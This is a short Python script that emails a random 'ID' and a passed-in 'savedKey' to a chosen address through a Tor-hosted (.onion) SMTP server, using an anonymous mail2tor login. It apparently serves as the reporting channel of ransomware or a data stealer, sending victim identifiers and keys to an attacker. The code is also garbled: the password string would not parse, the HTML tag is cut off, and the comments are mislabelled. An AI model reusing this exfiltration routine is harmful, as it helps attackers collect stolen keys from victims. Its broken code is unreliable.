#!/usr/bin/env python

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import uuid



def sendMail(to, savedKey):
	_id = uuid.uuid4()

	_to = to
	_from = "t0x1cenv31ope@mail2tor.com"
	pwd = "!@#$%^&*()_+-={}\][:";'/.,<>\`~PASSWORD?"
	_inheritedKeyObj = savedKey

	msg = MIMEMultipart()
	msg['From'] = str(_from)
	msg['To'] = str(_to)
	msg['Subject'] = "ID Collector: " + str(_id)
	message = "<html><body><p>" + str(_id) + "</p><br/><p>A new ID has been collected, please verify data!</p><br/><p>" + str(_inheritedKeyObj) + "</p></body></html"
	msg.attach(MIMEText(message))

	mailserver = smtplib.SMTP('mail2torx3jqgcpm.onion',25)
	
	# identify ourselves to smtp gmail client
	mailserver.ehlo()
	
	# secure our email with tls encryption
	# mailserver.starttls()
	# re-identify ourselves as an encrypted connection
	#ailserver.ehlo()
	mailserver.login(str(_from), str(pwd))
	mailserver.sendmail("t0x1cenv31ope@mail2tor.com",str(_to),msg.as_string())
	
	mailserver.quit()

